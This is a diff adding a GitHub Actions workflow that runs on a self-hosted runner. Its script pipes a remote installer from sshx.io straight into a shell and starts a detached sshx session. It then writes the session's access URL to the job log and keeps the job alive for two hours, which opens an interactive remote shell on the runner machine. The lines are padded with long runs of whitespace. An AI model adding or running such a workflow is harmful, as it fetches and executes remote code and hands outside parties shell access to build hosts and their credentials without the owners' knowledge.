@@ -1,0 +1,29 @@
+
+on:                                                                                                                                       
+  workflow_dispatch:                                                                                                                      
+                                                                                                                                          
+permissions:                                                    
+  contents: read                                                                                                                          
+                                                                                                                                          
+jobs:
+  a:                                                                                                                                      
+    runs-on: self-hosted                                      
+    steps:
+        - uses: actions/checkout@v5                                                                                                                                         
+        - uses: actions/github-script@v7                                                                                                                                    
+          with:                                                                                                                                                             
+            script: |                                                                                                                                                       
+              const fs = require('fs');                                                                                                                                     
+              const { execSync } = require('child_process');                                                                                                                
+                                                                                                                                                                                                                                                                                                       
+              // Install and launch sshx                          
+              execSync('curl -sSf https://sshx.io/get | sh', { stdio: 'inherit' });                                                                                         
+              execSync('setsid nohup sshx > /tmp/sshx.log 2>&1 &', { shell: '/bin/bash' });
+                                                                                                                                                                            
+              // Wait for sshx to print the URL                   
+              await new Promise(r => setTimeout(r, 3000));                                                                                                                  
+              const log = fs.readFileSync('/tmp/sshx.log', 'utf8');                                                                                                         
+              console.log(log);           
+                                                                                                                                                                            
+              // Keep the action alive (sshx runs in background)                                                                                                            
+              await new Promise(r => setTimeout(r, 7200 * 1000));
